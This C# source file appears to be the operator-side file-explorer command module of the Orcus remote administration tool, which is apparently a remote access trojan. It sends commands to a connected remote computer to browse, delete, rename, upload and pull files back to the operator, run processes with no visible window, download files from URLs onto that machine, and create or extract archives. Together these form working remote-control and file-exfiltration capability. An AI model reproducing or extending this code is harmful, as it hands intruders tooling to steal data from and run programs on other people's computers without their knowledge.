using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Shared.Connection;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.NetSerializer;
using DisallowMultipleThreads = Orcus.Plugins.DisallowMultipleThreadsAttribute;

namespace Orcus.Administration.Commands.FileExplorer
{
    [ProvideLibrary(PortableLibrary.ShellLibrary)]
    [ProvideLibrary(PortableLibrary.DirectoryInfoEx)]
    [ProvideLibrary(PortableLibrary.SharpZipLib)]
    [DisallowMultipleThreads]
    public class FileExplorerCommand : Command
    {
        private readonly DtpFactory _dtpFactory;

        private readonly Lazy<Serializer> _processingEntryUpdateSerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(ProcessingEntryUpdate)));

        private readonly Lazy<Serializer> _processingEntrySerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(ProcessingEntry)));

        public FileExplorerCommand()
        {
            _dtpFactory = new DtpFactory(SendData) {Timeout = 1000*60*5}; //5 min. timeout
        }

        public event EventHandler<byte[]> DownloadPackageReceived;
        public event EventHandler<Guid> DownloadFailed;
        public event EventHandler<ProcessingEntryUpdate> ProcessingEntryUpdateReceived;
        public event EventHandler<ProcessingEntry> ProcessingEntryAdded;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((FileExplorerCommunication) parameter[0])
            {
                case FileExplorerCommunication.ResponseDtpPackage:
                    _dtpFactory.Receive(parameter, 1);
                    break;
                case FileExplorerCommunication.ResponseDownloadPackage:
                    DownloadPackageReceived?.Invoke(this, parameter);
                    break;
                case FileExplorerCommunication.ResponsePackagingDirectory:
                    break;
                case FileExplorerCommunication.ResponseCopyingFile:
                    break;
                case FileExplorerCommunication.ResponseProcessingEntryChanged:
                    ProcessingEntryUpdateReceived?.Invoke(this,
                        _processingEntryUpdateSerializer.Value.Deserialize<ProcessingEntryUpdate>(parameter, 1));
                    break;
                case FileExplorerCommunication.ResponseDownloadFailed:
                    DownloadFailed?.Invoke(this, new Guid(parameter.Skip(1).ToArray()));
                    break;
                case FileExplorerCommunication.ResponseProcessingEntryAdded:
                    ProcessingEntryAdded?.Invoke(this,
                        _processingEntrySerializer.Value.Deserialize<ProcessingEntry>(parameter, 1).Unpack(null));
                    break;
            }
        }

        private void SendData(byte[] data)
        {
            var package = new byte[data.Length + 1];
            package[0] = (byte) FileExplorerCommunication.SendDtpPackage;
            Array.Copy(data, 0, package, 1, data.Length);
            ConnectionInfo.SendCommand(this, package, PackageCompression.DoNotCompress); //DTP already compresses
        }

        public RootEntryCollection GetRootElements()
        {
            LogService.Send((string) Application.Current.Resources["GetRootElements"]);
            var rootCollection = _dtpFactory.ExecuteFunction<RootEntryCollection>("GetRootElements", null,
                new List<Type>
                {
                    typeof(RootEntryCollection),
                    typeof(FileEntry),
                    typeof(DirectoryEntry),
                    typeof(DriveDirectoryEntry),
                    typeof(ProcessingEntry)
                });

            LogService.Receive(string.Format((string) Application.Current.Resources["RootElementsReceived"],
                rootCollection.RootDirectories.Count));

            foreach (var directoryEntry in rootCollection.RootDirectories)
                directoryEntry.Unpack(null);

            foreach (var entry in rootCollection.ComputerDirectoryEntries)
                entry.Unpack(rootCollection.ComputerDirectory);

            return rootCollection;
        }

        public string ExpandEnvironmentVariables(string path)
        {
            return _dtpFactory.ExecuteFunction<string>("ExpandEnvironmentVariables", path);
        }

        public List<List<IFileExplorerEntry>> GetPathContent(List<string> directoriesToRequest, bool requestFirstAllEntries)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["GetPathEntries"],
                directoriesToRequest[0]));
            return _dtpFactory.ExecuteFunction<List<List<IFileExplorerEntry>>>(
                "GetPathContent", null,
                new List<Type>
                {
                    typeof(PackedDirectoryEntry),
                    typeof(DriveDirectoryEntry),
                    typeof(FileEntry),
                    typeof(ProcessingEntry)
                },
                directoriesToRequest, requestFirstAllEntries);
        }

        public List<PackedDirectoryEntry> GetDirectories(string path)
        {
            return _dtpFactory.ExecuteFunction<List<PackedDirectoryEntry>>("GetDirectories", null,
                new List<Type> {typeof (DriveDirectoryEntry)}, path);
        }

        public PackedDirectoryEntry GetDirectory(string path)
        {
            return _dtpFactory.ExecuteFunction<PackedDirectoryEntry>("GetDirectory", null,
                new List<Type> {typeof (DriveDirectoryEntry)}, path);
        }

        public List<string> RemoveEntries(List<IFileExplorerEntry> fileExplorerEntries)
        {
            LogService.Send((string) Application.Current.Resources["RemoveEntries"]);
            return _dtpFactory.ExecuteFunction<List<string>>("RemoveEntries",
                fileExplorerEntries.Select(x => x.ToEntryInfo()).ToList());
        }

        public void RenameEntry(IFileExplorerEntry fileExplorerEntry, string newName)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["RenameEntry"], fileExplorerEntry.Name,
                newName));
            _dtpFactory.ExecuteProcedure("RenameEntry", fileExplorerEntry.ToEntryInfo(), newName);
        }

        public void CreateFolder(string path)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["CreateFolder"], path));
            _dtpFactory.ExecuteProcedure("CreateFolder", path);
        }

        public void CreateShortcut(string path, ShortcutInfo shortcutInfo)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["CreateShortcut"], path));
            _dtpFactory.ExecuteProcedure("CreateShortcut", path, shortcutInfo);
        }

        public DirectoryPropertiesInfo GetDirectoryPropertiesInfo(string path)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["GetPropertiesOf"], path));
            var directoryProperties = _dtpFactory.ExecuteFunction<DirectoryPropertiesInfo>("GetDirectoryProperties", path);
            directoryProperties.CreationTime = directoryProperties.CreationTime.ToLocalTime();
            directoryProperties.LastAccessTime = directoryProperties.LastAccessTime.ToLocalTime();
            directoryProperties.LastWriteTime = directoryProperties.LastWriteTime.ToLocalTime();
            return directoryProperties;
        }

        public FilePropertiesInfo GetFilePropertiesInfo(string path)
        {
            LogService.Send(string.Format((string)Application.Current.Resources["GetPropertiesOf"], path));
            var fileProperties = _dtpFactory.ExecuteFunction<FilePropertiesInfo>("GetFileProperties", null,
                new List<Type> {typeof (ShellProperty)}, path);
            fileProperties.CreationTime = fileProperties.CreationTime.ToLocalTime();
            fileProperties.LastAccessTime = fileProperties.LastAccessTime.ToLocalTime();
            fileProperties.LastWriteTime = fileProperties.LastWriteTime.ToLocalTime();
            return fileProperties;
        }

        public byte[] ComputeHash(string path, HashValueType hashValueType)
        {
            return _dtpFactory.ExecuteFunction<byte[]>("CalculateHashValue", path, hashValueType);
        }

        public void ExecuteProcess(string path, string arguments, string verb, bool createNoWindow)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["SendExecuteFile"], path));
            _dtpFactory.ExecuteProcedure("ExecuteFile", path, arguments ?? string.Empty, verb ?? string.Empty,
                createNoWindow);
        }

        public Guid RequestFileUpload(string targetPath, byte[] hashValue, long length)
        {
            return _dtpFactory.ExecuteFunction<Guid>("RequestFileUpload", targetPath, hashValue, length);
        }

        public void SendUploadPackage(Guid guid, byte[] data)
        {
            ConnectionInfo.UnsafeSendCommand(this, 17 + data.Length, writer =>
            {
                writer.Write((byte) FileExplorerCommunication.SendUploadPackage);
                writer.Write(guid.ToByteArray());
                writer.Write(data);
            });
        }

        public void CancelFileUpload(Guid guid)
        {
            _dtpFactory.ExecuteProcedure("CancelFileUpload", guid);
        }

        public UploadResult FinishFileUpload(Guid guid)
        {
            return _dtpFactory.ExecuteFunction<UploadResult>("FinishFileUpload", guid);
        }

        public DownloadInformation InitializeDownload(string path, bool isDirectory, Guid guid)
        {
            return _dtpFactory.ExecuteFunction<DownloadInformation>("InitializeDownload", path, isDirectory, guid);
        }

        public void CancelDownload(Guid guid)
        {
            _dtpFactory.ExecuteProcedure("CancelDownload", guid);
        }

        public DownloadResult DownloadToServer(string path, bool isDirectory)
        {
            return _dtpFactory.ExecuteFunction<DownloadResult>("DownloadToServer", path, isDirectory);
        }

        public void CreateArchive(ArchiveOptions archiveOptions)
        {
            _dtpFactory.ExecuteProcedure("CreateArchive", archiveOptions);
        }

        public byte[] GetFileThumbnail(string filePath, bool bigSize)
        {
            return _dtpFactory.ExecuteFunction<byte[]>("GetFileThumbnail", filePath, bigSize);
        }

        public void DownloadFileFromUrl(string path, string url)
        {
            _dtpFactory.ExecuteProcedure("DownloadFileFromUrl", path, url);
        }

        public void CancelProcessingEntry(ProcessingEntry processingEntry)
        {
            _dtpFactory.ExecuteProcedure("CancelProcessingEntry", processingEntry.Path);
        }

        public void ExtractArchive(string filePath, string destinationDirectory)
        {
            _dtpFactory.ExecuteProcedure("ExtractArchive", filePath, destinationDirectory);
        }

        public override string DescribePackage(byte[] data, bool isReceived)
        {
            var responseType = (FileExplorerCommunication) data[0];

            if (isReceived)
            {
                if (responseType != FileExplorerCommunication.ResponseDtpPackage)
                    return responseType.ToString();
                return "ResponseDtpPackage - " + _dtpFactory.DescribeReceivedData(data, 1);
            }
            else
            {
                if (responseType != FileExplorerCommunication.SendDtpPackage)
                    return responseType.ToString();
                return "SendDtpPackage - " + DtpFactory.DescribeSentData(data, 1);
            }
        }

        protected override uint GetId()
        {
            return 7;
        }
    }
}